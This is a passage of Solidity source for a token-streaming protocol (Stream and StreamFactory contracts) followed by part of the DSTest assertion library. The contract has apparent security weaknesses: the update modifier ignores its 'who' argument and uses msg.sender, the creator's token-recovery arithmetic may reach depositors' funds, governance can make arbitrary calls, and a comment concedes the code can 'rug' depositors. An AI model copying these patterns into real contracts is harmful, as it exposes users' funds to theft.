   }\n\n    // ======= Storage ========\n    // ==== Immutables =====\n    // stream start time\n    uint32 private immutable startTime;\n    // length of stream\n    uint32 private immutable streamDuration;\n    // length of time depositTokens are locked after stream ends\n    uint32 private immutable depositLockDuration;\n    // length of time rewardTokens are locked after stream ends\n    uint32 private immutable rewardLockDuration;\n\n    // end of stream\n    uint32 private immutable endStream;\n    // end of deposit lock\n    uint32 private immutable endDepositLock;\n    // end of reward lock\n    uint32 private immutable endRewardLock;\n\n    // Token given to depositer\n    address public immutable rewardToken;\n    // Token deposited\n    address public immutable depositToken;\n\n    // This stream's id\n    uint64 public immutable streamId;\n\n    // fee percent on reward tokens\n    uint16 private immutable feePercent;\n    // are fees enabled\n    bool private immutable feeEnabled;\n\n    // deposits are basically a *sale* to the stream creator if true\n    bool public immutable isSale;\n\n    // stream creator\n    address public immutable streamCreator;\n\n    uint112 private immutable depositDecimalsOne;\n    // ============\n\n    //  == sloc a ==\n    // internal reward token amount to be given to depositors\n    uint112 private rewardTokenAmount;\n    // internal deposit token amount locked/to be sold to stream creator\n    uint112 private depositTokenAmount;\n    // ============\n\n    // == slot b ==\n    uint112 private rewardTokenFeeAmount;\n    uint112 private depositTokenFlashloanFeeAmount;\n    uint8 private unlocked = 1;\n    bool private claimedDepositTokens;\n    // ============\n\n    // == slot c ==\n    uint256 private cumulativeRewardPerToken;\n    // ============\n\n    // == slot d ==\n    uint256 private totalVirtualBalance;\n    // ============\n\n    // == slot e ==\n    uint112 public unstreamed;\n    uint112 private redeemedDepositTokens;\n    uint32 private lastUpdate;\n    // ============\n\n    // mapping of address to number of tokens not yet streamed over\n    mapping (address => TokenStream) public tokensNotYetStreamed;\n\n    // external incentives to stream creator\n    mapping (address => uint112) public incentives;\n\n    // ======= Events ========\n    event StreamFunded(uint256 amount);\n    event Staked(address indexed who, uint256 amount);\n    event Withdrawn(address indexed who, uint256 amount);\n    event StreamIncentivized(address indexed token, uint256 amount);\n    event StreamIncentiveClaimed(address indexed token, uint256 amount);\n    event SoldTokensClaimed(address indexed who, uint256 amount);\n    event DepositTokensReclaimed(address indexed who, uint256 amount);\n    event FeesClaimed(address indexed token, address indexed who, uint256 amount);\n    event RecoveredTokens(address indexed token, address indexed recipient, uint256 amount);\n    event RewardsClaimed(address indexed who, uint256 amount);\n    event Flashloaned(address indexed token, address indexed who, uint256 amount, uint256 fee);\n\n    // ======= Modifiers ========\n    modifier updateStream(address who) {\n        // save bytecode space by making it a jump instead of inlining at cost of gas\n        updateStreamInternal(who);\n        _;\n    }\n\n    function updateStreamInternal(address who) internal {\n        require(block.timestamp < endStream , \"!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        if (block.timestamp >= startTime) {\n            // set lastUpdates if need be\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = uint32(block.timestamp);\n            }\n\n            // accumulate reward per token info\n            cumulativeRewardPerToken = rewardPerToken();\n\n            // update user rewards\n            ts.rewards = earned(ts, cumulativeRewardPerToken);\n            // update users last cumulative reward per token\n            ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n            // update users unstreamed balance\n            uint32 acctTimeDelta = uint32(block.timestamp) - ts.lastUpdate;\n            if (acctTimeDelta > 0 && ts.tokens > 0) {\n                // some time has passed since this user last interacted\n                // update ts not yet streamed\n                ts.tokens -= uint112(acctTimeDelta * ts.tokens / (endStream - ts.lastUpdate));\n                ts.lastUpdate = uint32(block.timestamp);\n            }\n\n            // handle global unstreamed\n            uint32 tdelta = uint32(block.timestamp - lastUpdate);\n            // stream tokens over\n            if (tdelta > 0 && unstreamed > 0) {\n                uint256 globalStreamingSpeedPerSecond = (uint256(unstreamed) * 10**6)/ (endStream - lastUpdate);\n                unstreamed -= uint112((uint256(tdelta) * globalStreamingSpeedPerSecond) / 10**6);\n            }\n            // already ensure that blocktimestamp is less than endStream so guaranteed ok here\n            lastUpdate = uint32(block.timestamp);\n        } else {\n            if (ts.lastUpdate == 0) {\n                ts.lastUpdate = startTime;\n            }\n            if (lastUpdate == 0) {\n                lastUpdate = startTime;\n            }\n        }\n    }\n\n\n    function lockInternal() internal {\n        require(unlocked == 1, \"re\");\n        unlocked = 2;\n    }\n    modifier lock {\n        lockInternal();\n        _;\n        unlocked = 1;\n    }\n\n    constructor(\n        uint64 _streamId,\n        address creator,\n        bool _isSale,\n        address _rewardToken,\n        address _depositToken,\n        uint32 _startTime,\n        uint32 _streamDuration,\n        uint32 _depositLockDuration,\n        uint32 _rewardLockDuration,\n        uint16 _feePercent,\n        bool _feeEnabled\n\n    )\n        LockeERC20(_depositToken, _streamId, _startTime + _streamDuration)\n        ExternallyGoverned(msg.sender) // inherit factory governance\n        public \n    {\n        // set fee info\n        feePercent = _feePercent;\n        feeEnabled = _feeEnabled;\n\n        // limit feePercent\n        require(feePercent < 10000, \"fee\");\n    \n        // store streamParams\n        startTime = _startTime;\n        streamDuration = _streamDuration;\n        depositLockDuration = _depositLockDuration;\n        rewardLockDuration = _rewardLockDuration;\n\n        endStream = startTime + streamDuration;\n        endDepositLock = endStream + depositLockDuration;\n        endRewardLock = endStream + rewardLockDuration;\n    \n        // set tokens\n        depositToken = _depositToken;\n        rewardToken = _rewardToken;\n\n        // set streamId\n        streamId = _streamId;\n\n        // set sale info\n        isSale = _isSale;\n    \n        streamCreator = creator;\n\n        depositDecimalsOne = uint112(10**ERC20(depositToken).decimals());\n    }\n\n    /**\n     * @dev Returns relevant internal token amounts\n    **/\n    function tokenAmounts() public view returns (uint112, uint112, uint112, uint112) {\n        return (rewardTokenAmount, depositTokenAmount, rewardTokenFeeAmount, depositTokenFlashloanFeeAmount);\n    }\n\n    /**\n     * @dev Returns fee parameters\n    **/\n    function feeParams() public view returns (uint16, bool) {\n        return (feePercent, feeEnabled);\n    }\n\n    /**\n     * @dev Returns stream parameters\n    **/\n    function streamParams() public view returns (uint32,uint32,uint32,uint32) {\n        return (\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration\n        );\n    }\n\n    function lastApplicableTime() internal view returns (uint32) {\n        return block.timestamp <= endStream ? uint32(block.timestamp) : endStream;\n    }\n\n    function rewardPerToken() public view returns (uint256) {\n        if (totalVirtualBalance == 0) {\n            return cumulativeRewardPerToken;\n        } else {\n            // \u2206time*rewardTokensPerSecond*oneDepositToken / totalVirtualBalance\n            return cumulativeRewardPerToken + (\n                ((uint256(lastApplicableTime()) - lastUpdate) * rewardTokenAmount * depositDecimalsOne/streamDuration) \n                / totalVirtualBalance\n            );\n        }\n    }\n\n    function dilutedBalance(uint112 amount) internal view returns (uint256) {\n        // duration / timeRemaining * amount\n        if (block.timestamp < startTime) {\n            return amount;\n        } else {\n            uint32 timeRemaining = endStream - uint32(block.timestamp);\n            return ((uint256(streamDuration) * amount * 10**6) / timeRemaining) / 10**6;\n        }\n    }\n\n    function getEarned(address who) public view returns (uint256) {\n        TokenStream storage ts = tokensNotYetStreamed[who];\n        return earned(ts, rewardPerToken());\n    }\n\n    function earned(TokenStream storage ts, uint256 currCumRewardPerToken) internal view returns (uint112) {\n        return uint112(ts.virtualBalance * (currCumRewardPerToken - ts.lastCumulativeRewardPerToken) / depositDecimalsOne) + ts.rewards;\n    }\n\n    /**\n     * @dev Allows _anyone_ to fund this stream, if its before the stream start time\n    **/\n    function fundStream(uint112 amount) public lock {\n        require(amount > 0, \"amt\");\n        require(block.timestamp < startTime, \"time\");\n        uint112 amt;\n\n        // transfer from sender\n        uint256 prevBal = ERC20(rewardToken).balanceOf(address(this));\n        ERC20(rewardToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(rewardToken).balanceOf(address(this));\n        require(newBal < type(uint112).max && newBal > prevBal, \"erc\");\n\n        amount = uint112(newBal - prevBal);\n        // if fee is enabled, take a fee\n        if (feeEnabled) {\n            // Safety:\n            //  1. feePercent & y are casted up to u256, so cannot overflow when multiplying\n            //  2. downcast is safe because (x*y)/MAX_X is guaranteed to be smaller than y which is uint112\n            //  3. amount is guaranteed to be greater than feeAmt\n            uint112 feeAmt;\n            unchecked {\n                feeAmt = uint112(uint256(feePercent) * uint256(amount) / 10000); \n                amt = amount - feeAmt;\n            }\n\n            // since this operation can be repeated, we cannot assume no overflow so use checked math\n            rewardTokenFeeAmount += feeAmt;\n            rewardTokenAmount += amt;\n        } else {\n            amt = amount;\n            rewardTokenAmount += amt;\n        }\n        \n        emit StreamFunded(amt);\n    }\n\n    /**\n     *  @dev Deposits depositTokens into this stream\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function stake(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // require(block.timestamp < endStream, \"stake:!stream\");\n\n        // transfer tokens over\n        uint256 prevBal = ERC20(depositToken).balanceOf(address(this));\n        ERC20(depositToken).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(depositToken).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n        \n        uint112 trueDepositAmt = uint112(newBal - prevBal);\n\n        depositTokenAmount += trueDepositAmt;\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        ts.tokens += trueDepositAmt;\n\n        uint256 virtualBal = dilutedBalance(trueDepositAmt);\n        ts.virtualBalance += virtualBal;\n        totalVirtualBalance += virtualBal;\n        unstreamed += trueDepositAmt;\n\n        if (!isSale) {\n            // not a straight sale, so give the user some receipt tokens\n            _mint(msg.sender, trueDepositAmt);\n        } else {\n        }\n\n        emit Staked(msg.sender, trueDepositAmt);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to withdraw a specific amount of depositTokens during a stream,\n     *  up to their tokensNotYetStreamed amount\n     * \n     *  additionally, updates tokensNotYetStreamed\n    */ \n    function withdraw(uint112 amount) public lock updateStream(msg.sender) {\n        require(amount > 0, \"amt\");\n\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n\n        require(ts.tokens >= amount, \"amt\");\n        ts.tokens -= amount;\n\n        uint256 virtualBal = dilutedBalance(amount);\n        ts.virtualBalance -= virtualBal;\n        totalVirtualBalance -= virtualBal;\n        depositTokenAmount -= amount;\n        if (!isSale) {\n            _burn(msg.sender, amount);\n        } else {\n        }\n\n        // do the transfer\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit Withdrawn(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a stream depositor to exit their entire remaining tokens that haven't streamed\n     *  and burns receiptTokens if its not a sale.\n     * \n     *  additionally, updates tokensNotYetStreamed. Lock is done in withdraw\n    */ \n    function exit() public updateStream(msg.sender) {\n        // checked in updateStream\n        // is the stream still going on? thats the only time a depositer can withdraw\n        // require(block.timestamp < endStream, \"withdraw:!stream\");\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        uint112 amount = ts.tokens;\n        withdraw(amount);\n    }\n\n    /**\n     *  @dev Allows anyone to incentivize this stream with extra tokens\n     *  and requires the incentive to not be the reward or deposit token\n    */ \n    function createIncentive(address token, uint112 amount) public lock {\n        require(token != rewardToken && token != depositToken, \"inc\");\n        \n        uint256 prevBal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransferFrom(msg.sender, address(this), amount);\n        uint256 newBal = ERC20(token).balanceOf(address(this));\n        require(newBal <= type(uint112).max && newBal > prevBal, \"erc\");\n\n        uint112 amt = uint112(newBal - prevBal);\n        incentives[token] += amt;\n        emit StreamIncentivized(token, amt);\n    }\n\n    /**\n     *  @dev Allows the stream creator to claim an incentive once the stream is done\n    */ \n    function claimIncentive(address token) public lock {\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        uint112 amount = incentives[token];\n        require(amount > 0, \"amt\");\n        incentives[token] = 0;\n        ERC20(token).safeTransfer(msg.sender, amount);\n        emit StreamIncentiveClaimed(token, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder to reclaim deposit tokens if the deposit lock is done & their receiptToken amount\n     *  is greater than the requested amount\n    */ \n    function claimDepositTokens(uint112 amount) public lock {\n        require(!isSale, \"sale\");\n        // NOTE: given that endDepositLock is strictly *after* the last time withdraw or exit is callable\n        // we dont need to updateStream(msg.sender)\n        require(amount > 0, \"amt\");\n\n        // is the stream over + the deposit lock period over? thats the only time receiptTokens can be burned for depositTokens after stream is over\n        require(block.timestamp > endDepositLock, \"lock\");\n\n        // burn the receiptTokens\n        _burn(msg.sender, amount);\n\n        redeemedDepositTokens += amount;\n\n        // send the receipt token holder back the funds\n        ERC20(depositToken).safeTransfer(msg.sender, amount);\n\n        emit DepositTokensReclaimed(msg.sender, amount);\n    }\n\n    /**\n     *  @dev Allows a receipt token holder (or original depositor in case of a sale) to claim their rewardTokens\n    */ \n    function claimReward() public lock {\n        require(block.timestamp > endRewardLock, \"lock\");\n\n        TokenStream storage ts = tokensNotYetStreamed[msg.sender];\n        // accumulate reward per token info\n        cumulativeRewardPerToken = rewardPerToken();\n\n        // update user rewards\n        ts.rewards = earned(ts, cumulativeRewardPerToken);\n        // update users last cumulative reward per token\n        ts.lastCumulativeRewardPerToken = cumulativeRewardPerToken;\n\n        lastUpdate = lastApplicableTime();\n\n        uint256 rewardAmt = ts.rewards;\n        ts.rewards = 0;\n\n        require(rewardAmt > 0, \"amt\");\n\n        // transfer the tokens\n        ERC20(rewardToken).safeTransfer(msg.sender, rewardAmt);\n\n        emit RewardsClaimed(msg.sender, rewardAmt);\n    }\n\n    /**\n     *  @dev Allows a creator to claim sold tokens if the stream has ended & this contract is a sale\n    */ \n    function creatorClaimSoldTokens(address destination) public lock {\n        // can only claim when its a sale\n        require(isSale, \"!sale\");\n\n        // only can claim once\n        require(!claimedDepositTokens, \"claimed\");\n        // creator is claiming\n        require(msg.sender == streamCreator, \"!creator\");\n        // stream ended\n        require(block.timestamp >= endStream, \"stream\");\n        \n        uint112 amount = depositTokenAmount;\n        claimedDepositTokens = true;\n\n        ERC20(depositToken).safeTransfer(destination, amount);\n\n        emit SoldTokensClaimed(destination, amount);\n    }\n\n    /**\n     *  @dev Allows the governance contract of the factory to select a destination\n     *  and transfer fees (in rewardTokens) to that address totaling the total fee amount\n    */ \n    function claimFees(address destination) public lock externallyGoverned {\n        // Stream is done\n        require(block.timestamp >= endStream, \"stream\");\n\n        // reset fee amount\n        uint112 fees = rewardTokenFeeAmount;\n        if (fees > 0) {\n            rewardTokenFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(rewardToken).safeTransfer(destination, fees);\n            emit FeesClaimed(rewardToken, destination, fees);\n        }\n\n        fees = depositTokenFlashloanFeeAmount;\n        if (fees > 0) {\n            depositTokenFlashloanFeeAmount = 0;\n\n            // transfer and emit event\n            ERC20(depositToken).safeTransfer(destination, fees);\n\n            emit FeesClaimed(depositToken, destination, fees);\n        }\n        \n    }\n\n    // ======== Non-protocol functions ========\n\n    /**\n     *  @dev Allows the stream creator to save tokens\n     *  There are some limitations to this:\n     *      1. if its deposit token:\n     *          - DepositLock is fully done\n     *          - There are excess deposit tokens (balance - depositTokenAmount)\n     *      2. if its the reward token:\n     *          - RewardLock is fully done\n     *          - Excess defined as balance - (rewardTokenAmount + rewardTokenFeeAmount)\n     *      3. if incentivized:\n     *          - excesss defined as bal - incentives[token]\n    */ \n    function recoverTokens(address token, address recipient) public lock {\n        // NOTE: it is the stream creators responsibility to save\n        // tokens on behalf of their users.\n        require(msg.sender == streamCreator, \"!creator\");\n        if (token == depositToken) {\n            require(block.timestamp > endDepositLock, \"time\");\n            // get the balance of this contract\n            // check what isnt claimable by either party\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (depositTokenAmount - redeemedDepositTokens);\n            // allow saving of the token\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n        \n        if (token == rewardToken) {\n            require(block.timestamp > endRewardLock, \"time\");\n            // check current balance vs internal balance\n            //\n            // NOTE: if a token rebases, i.e. changes balance out from under us,\n            // most of this contract breaks and rugs depositors. this isn't exclusive\n            // to this function but this function would in theory allow someone to rug\n            // and recover the excess (if it is worth anything)\n\n            // check what isnt claimable by depositors and governance\n            uint256 excess = ERC20(token).balanceOf(address(this)) - (rewardTokenAmount + rewardTokenFeeAmount);\n            ERC20(token).safeTransfer(recipient, excess);\n\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        if (incentives[token] > 0) {\n            require(block.timestamp >= endStream, \"stream\");\n            uint256 excess = ERC20(token).balanceOf(address(this)) - incentives[token];\n            ERC20(token).safeTransfer(recipient, excess);\n            emit RecoveredTokens(token, recipient, excess);\n            return;\n        }\n\n        // not reward token nor deposit nor incentivized token, free to transfer\n        uint256 bal = ERC20(token).balanceOf(address(this));\n        ERC20(token).safeTransfer(recipient, bal);\n        emit RecoveredTokens(token, recipient, bal);\n    }\n\n    /**\n     *  @dev Allows anyone to flashloan reward or deposit token for a 10bps fee\n    */\n    function flashloan(address token, address to, uint112 amount, bytes memory data) public lock {\n        require(token == depositToken || token == rewardToken, \"erc\");\n\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        ERC20(token).safeTransfer(to, amount);\n\n        // the `to` contract should have a public function with the signature:\n        // function lockeCall(address initiator, address token, uint256 amount, bytes memory data);\n        LockeCallee(to).lockeCall(msg.sender, token, amount, data);\n\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        uint112 feeAmt = amount * 10 / 10000; // 10bps fee\n\n        if (token == depositToken) {\n            depositTokenFlashloanFeeAmount += feeAmt;\n            require(preDepositTokenBalance + feeAmt <= postDepositTokenBalance, \"f1\");\n            require(preRewardTokenBalance <= postRewardTokenBalance, \"f2\");\n        } else {\n            rewardTokenFeeAmount += feeAmt;\n            require(preDepositTokenBalance <= postDepositTokenBalance, \"f3\");\n            require(preRewardTokenBalance + feeAmt <= postRewardTokenBalance, \"f4\");\n        }\n\n        emit Flashloaned(token, msg.sender, amount, feeAmt);\n    }\n\n    /**\n     *  @dev Allows inherited governance contract to call functions on behalf of this contract\n     *  This is a potentially dangerous function so to ensure trustlessness, *all* balances\n     *  that may matter are guaranteed to not change.\n     * \n     *  The primary usecase is for claiming potentially airdrops that may have accrued on behalf of this contract\n    */\n    function arbitraryCall(address who, bytes memory data) public lock externallyGoverned {\n        // cannot have an active incentive for the callee\n        require(incentives[who] == 0, \"inc\");\n        // cannot be to deposit token nor reward token\n        require(who != depositToken && who != rewardToken, \"erc\");\n\n        // get token balances\n        uint256 preDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 preRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n\n        (bool success, bytes memory _ret) = who.call(data);\n        require(success);\n\n        // require no change in balances\n        uint256 postDepositTokenBalance = ERC20(depositToken).balanceOf(address(this));\n        uint256 postRewardTokenBalance = ERC20(rewardToken).balanceOf(address(this));\n        require(preDepositTokenBalance == postDepositTokenBalance && preRewardTokenBalance == postRewardTokenBalance, \"erc\");\n    }\n}\n\ncontract StreamFactory is Governed {\n\n    // ======= Structs ========\n    struct GovernableStreamParams {\n        uint32 maxDepositLockDuration;\n        uint32 maxRewardLockDuration;\n        uint32 maxStreamDuration;\n        uint32 minStreamDuration;\n    }\n\n    struct GovernableFeeParams {\n        uint16 feePercent;\n        bool feeEnabled;\n    }\n\n    // ======= Storage ========\n    GovernableStreamParams public streamParams;\n    GovernableFeeParams public feeParams;\n    uint64 public currStreamId; \n\n    uint16 constant MAX_FEE_PERCENT = 500; // 500/10000 == 5%\n\n    // =======  Events  =======\n    event StreamCreated(uint256 indexed stream_id, address stream_addr);\n    event StreamParametersUpdated(GovernableStreamParams oldParams, GovernableStreamParams newParams);\n    event FeeParametersUpdated(GovernableFeeParams oldParams, GovernableFeeParams newParams);\n\n    constructor(address _governor, address _emergency_governor) public Governed(_governor, _emergency_governor) {\n        streamParams = GovernableStreamParams({\n            maxDepositLockDuration: 52 weeks,\n            maxRewardLockDuration: 52 weeks,\n            maxStreamDuration: 2 weeks,\n            minStreamDuration: 1 hours\n        });\n    }\n\n    /**\n     * @dev Deploys a minimal contract pointing to streaming logic. This contract will also be the token contract\n     * for the receipt token. It custodies the depositTokens until depositLockDuration is complete. After\n     * lockDuration is completed, the depositTokens can be claimed by the original depositors\n     * \n    **/\n    function createStream(\n        address rewardToken,\n        address depositToken,\n        uint32 startTime,\n        uint32 streamDuration,\n        uint32 depositLockDuration,\n        uint32 rewardLockDuration,\n        bool isSale\n    )\n        public\n        returns (Stream)\n    {\n        // perform checks\n\n        {\n            require(startTime >= block.timestamp, \"past\");\n            require(streamDuration >= streamParams.minStreamDuration && streamDuration <= streamParams.maxStreamDuration, \"stream\");\n            require(depositLockDuration <= streamParams.maxDepositLockDuration, \"lock\");\n            require(rewardLockDuration <= streamParams.maxRewardLockDuration, \"reward\");\n        }\n        \n\n        // TODO: figure out sane salt, i.e. streamid + x? streamid guaranteed to be unique\n        uint64 that_stream = currStreamId;\n        currStreamId += 1;\n        bytes32 salt = bytes32(uint256(that_stream));\n\n        Stream stream = new Stream{salt: salt}(\n            that_stream,\n            msg.sender,\n            isSale,\n            rewardToken,\n            depositToken,\n            startTime,\n            streamDuration,\n            depositLockDuration,\n            rewardLockDuration,\n            feeParams.feePercent,\n            feeParams.feeEnabled\n        );\n\n        emit StreamCreated(that_stream, address(stream));\n\n        return stream;\n    }\n\n    function updateStreamParams(GovernableStreamParams memory newParams) public governed {\n        // DATA VALIDATION:\n        //  there is no real concept of \"sane\" limits here, and if misconfigured its ultimated\n        //  not a massive deal so no data validation is done\n        GovernableStreamParams memory old = streamParams;\n        streamParams = newParams;\n        emit StreamParametersUpdated(old, newParams);\n    }\n\n    function updateFeeParams(GovernableFeeParams memory newFeeParams) public governed {\n        require(newFeeParams.feePercent <= MAX_FEE_PERCENT, \"fee\");\n        GovernableFeeParams memory old = feeParams;\n        feeParams = newFeeParams;\n        emit FeeParametersUpdated(old, newFeeParams);\n    }\n}\n\n\n// SPDX-License-Identifier: GPL-3.0-or-later\n\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// (at your option) any later version.\n\n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n\n// You should have received a copy of the GNU General Public License\n// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n\npragma solidity >=0.4.23;\n\ncontract DSTest {\n    event log                    (string);\n    event logs                   (bytes);\n\n    event log_address            (address);\n    event log_bytes32            (bytes32);\n    event log_int                (int);\n    event log_uint               (uint);\n    event log_bytes              (bytes);\n    event log_string             (string);\n\n    event log_named_address      (string key, address val);\n    event log_named_bytes32      (string key, bytes32 val);\n    event log_named_decimal_int  (string key, int val, uint decimals);\n    event log_named_decimal_uint (string key, uint val, uint decimals);\n    event log_named_int          (string key, int val);\n    event log_named_uint         (string key, uint val);\n    event log_named_bytes        (string key, bytes val);\n    event log_named_string       (string key, string val);\n\n    bool public IS_TEST = true;\n    bool public failed;\n\n    address constant HEVM_ADDRESS =\n        address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));\n\n    modifier mayRevert() { _; }\n    modifier testopts(string memory) { _; }\n\n    function fail() internal {\n        failed = true;\n    }\n\n    modifier logs_gas() {\n        uint startGas = gasleft();\n        _;\n        uint endGas = gasleft();\n        emit log_named_uint(\"gas\", startGas - endGas);\n    }\n\n    function assertTrue(bool condition) internal {\n        if (!condition) {\n            emit log(\"Error: Assertion Failed\");\n            fail();\n        }\n    }\n\n    function assertTrue(bool condition, string memory err) internal {\n        if (!condition) {\n            emit log_named_string(\"Error\", err);\n            assertTrue(condition);\n        }\n    }\n\n    function assertEq(address a, address b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [address]\");\n            emit log_named_address(\"  Expected\", b);\n            emit log_named_address(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(address a, address b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string (\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n\n    function assertEq(bytes32 a, bytes32 b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [bytes32]\");\n            emit log_named_bytes32(\"  Expected\", b);\n            emit log_named_bytes32(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(bytes32 a, bytes32 b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string (\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEq32(bytes32 a, bytes32 b) internal {\n        assertEq(a, b);\n    }\n    function assertEq32(bytes32 a, bytes32 b, string memory err) internal {\n        assertEq(a, b, err);\n    }\n\n    function assertEq(int a, int b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [int]\");\n            emit log_named_int(\"  Expected\", b);\n            emit log_named_int(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(int a, int b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEq(uint a, uint b) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [uint]\");\n            emit log_named_uint(\"  Expected\", b);\n            emit log_named_uint(\"    Actual\", a);\n            fail();\n        }\n    }\n    function assertEq(uint a, uint b, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEq(a, b);\n        }\n    }\n    function assertEqDecimal(int a, int b, uint decimals) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Expected\", b, decimals);\n            emit log_named_decimal_int(\"    Actual\", a, decimals);\n            fail();\n        }\n    }\n    function assertEqDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEqDecimal(a, b, decimals);\n        }\n    }\n    function assertEqDecimal(uint a, uint b, uint decimals) internal {\n        if (a != b) {\n            emit log(\"Error: a == b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Expected\", b, decimals);\n            emit log_named_decimal_uint(\"    Actual\", a, decimals);\n            fail();\n        }\n    }\n    function assertEqDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a != b) {\n            emit log_named_string(\"Error\", err);\n            assertEqDecimal(a, b, decimals);\n        }\n    }\n\n    function assertGt(uint a, uint b) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGt(uint a, uint b, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGt(a, b);\n        }\n    }\n    function assertGt(int a, int b) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGt(int a, int b, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGt(a, b);\n        }\n    }\n    function assertGtDecimal(int a, int b, uint decimals) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGtDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGtDecimal(a, b, decimals);\n        }\n    }\n    function assertGtDecimal(uint a, uint b, uint decimals) internal {\n        if (a <= b) {\n            emit log(\"Error: a > b not satisfied [decimal uint]\");\n            emit log_named_decimal_uint(\"  Value a\", a, decimals);\n            emit log_named_decimal_uint(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGtDecimal(uint a, uint b, uint decimals, string memory err) internal {\n        if (a <= b) {\n            emit log_named_string(\"Error\", err);\n            assertGtDecimal(a, b, decimals);\n        }\n    }\n\n    function assertGe(uint a, uint b) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [uint]\");\n            emit log_named_uint(\"  Value a\", a);\n            emit log_named_uint(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGe(uint a, uint b, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGe(a, b);\n        }\n    }\n    function assertGe(int a, int b) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [int]\");\n            emit log_named_int(\"  Value a\", a);\n            emit log_named_int(\"  Value b\", b);\n            fail();\n        }\n    }\n    function assertGe(int a, int b, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGe(a, b);\n        }\n    }\n    function assertGeDecimal(int a, int b, uint decimals) internal {\n        if (a < b) {\n            emit log(\"Error: a >= b not satisfied [decimal int]\");\n            emit log_named_decimal_int(\"  Value a\", a, decimals);\n            emit log_named_decimal_int(\"  Value b\", b, decimals);\n            fail();\n        }\n    }\n    function assertGeDecimal(int a, int b, uint decimals, string memory err) internal {\n        if (a < b) {\n            emit log_named_string(\"Error\", err);\n            assertGeDecimal(a, b, decimals);\n        }\n    